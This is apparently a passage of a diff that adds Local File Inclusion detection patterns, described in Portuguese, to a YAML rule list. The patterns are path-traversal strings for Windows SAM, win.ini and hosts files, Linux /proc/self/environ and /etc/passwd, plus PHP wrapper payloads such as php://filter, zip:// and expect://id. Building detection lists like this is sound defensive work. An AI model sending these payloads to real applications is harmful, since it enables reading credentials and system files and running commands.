+  description: "Possível tentativa de LFI para acessar logs de erro do Nginx"
+- pattern: "../../windows/win.ini"
+  description: "Possível tentativa de LFI para acessar configurações do Windows"
+- pattern: "../../boot.ini"
+  description: "Possível tentativa de LFI para acessar configurações de inicialização do Windows"
+- pattern: "../../WINDOWS/system32/drivers/etc/hosts"
+  description: "Possível tentativa de LFI para acessar configurações de rede no Windows"
+- pattern: "../../WINDOWS/system32/config/sam"
+  description: "Possível tentativa de LFI para acessar credenciais do Windows"
+- pattern: "../../WINDOWS/repair/sam"
+  description: "Possível tentativa de LFI para acessar backups de credenciais do Windows"
+- pattern: "/proc/self/cmdline"
+  description: "Possível tentativa de LFI para obter argumentos de execução do processo"
+- pattern: "/proc/self/environ"
+  description: "Possível tentativa de LFI para acessar variáveis de ambiente do processo"
+- pattern: "../../etc/issue"
+  description: "Possível tentativa de LFI para obter informações sobre a distribuição do sistema"
+- pattern: "php://filter/read=convert.base64-encode/resource=/etc/passwd"
+  description: "Possível tentativa de LFI utilizando filtros PHP para acessar arquivos críticos"
+- pattern: "data://text/plain;base64,"
+  description: "Possível tentativa de LFI utilizando data URI scheme"
+- pattern: "zip://../../etc/passwd"
+  description: "Possível tentativa de LFI utilizando wrapper ZIP do PHP"
+- pattern: "expect://id"
+  description: "Possível tentativa de LFI utilizando o wrapper expect do PHP para execução de comandos"
